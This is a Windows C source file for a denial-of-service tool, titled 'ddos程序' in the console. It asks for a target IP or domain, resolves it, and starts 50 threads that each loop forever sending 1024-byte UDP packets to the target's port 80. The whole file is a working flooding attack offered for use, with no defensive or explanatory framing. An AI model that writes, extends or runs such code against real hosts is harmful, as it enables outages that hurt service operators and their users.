#include "ddos.h"

// Link with ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Ntdll.lib")
#pragma warning(disable: 4996)
BOOL  getip(char* szHost, char szIp[50][100], int* nCount)
{
    WSADATA wsaData;
    HOSTENT* pHostEnt;
    int nAdapter = 0;
    sockaddr_in   sAddr;
    if (WSAStartup(0x0101, &wsaData))
    {
        printf(" 获取IP出错:\n");
        return FALSE;
    }
    pHostEnt = gethostbyname(szHost);
    if (pHostEnt)
    {
        while (pHostEnt->h_addr_list[nAdapter])
        {
            memcpy(&sAddr.sin_addr.s_addr, pHostEnt->h_addr_list[nAdapter], pHostEnt->h_length);

            sprintf_s(szIp[nAdapter], "%s", inet_ntoa(sAddr.sin_addr));

            nAdapter++;
        }

        *nCount = nAdapter;
    }
    else
    {
        DWORD  dwError = GetLastError();
        *nCount = 0;
    }
    WSACleanup();
    return TRUE;
}
char ip[255];
char SendBuf[1024];
int BufLen = 1024;
BOOL sendd() {
    int iResult;
    WSADATA wsaData;

    SOCKET SendSocket = INVALID_SOCKET;
    sockaddr_in RecvAddr;

    unsigned short Port = 80;


    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        wprintf(L"WSAStartup failed with error: %d\n", iResult);
        return FALSE;
    }
    SendSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (SendSocket == INVALID_SOCKET) {
        wprintf(L"socket failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    RecvAddr.sin_family = AF_INET;
    RecvAddr.sin_port = htons(Port);
    RecvAddr.sin_addr.s_addr = inet_addr(ip);
    iResult = sendto(SendSocket,
        SendBuf, BufLen, 0, (SOCKADDR*)&RecvAddr, sizeof(RecvAddr));
    if (iResult == SOCKET_ERROR) {
        wprintf(L"sendto failed with error: %d\n", WSAGetLastError());
        closesocket(SendSocket);
        WSACleanup();
        return FALSE;
    }
    printf("发送结束，无错误。\r\n");
    iResult = closesocket(SendSocket);
    if (iResult == SOCKET_ERROR) {
        wprintf(L"closesocket failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return FALSE;
    }
    WSACleanup();
    return TRUE;
}

DWORD WINAPI send_boom(LPVOID ip)
{
    while (1) {
        if (sendd() == FALSE) {
            return FALSE;
        }
    }
}
int main(int argc, char** argv) {
    _wsystem(L"title ddos程序");
    if (argc == 1) {
        printf("请输入目标主机公网IP(ipv4)或域名:");
        scanf_s("%s", ip, 255);
    }
    else {
        strcpy(ip, argv[1]);
    }

    char a[15][100];
    int n = 0;
    if (getip(ip, a, &n) != TRUE) {
        return -1;
    }
    strcpy(ip, a[0]);
    HANDLE hds[100];
    for (int i = 0; i < 50; i++) {
        hds[i] = CreateThread(NULL, 0, send_boom, NULL, NULL, NULL);
    }

    WaitForMultipleObjects(50, hds, TRUE, UINT_MAX);
}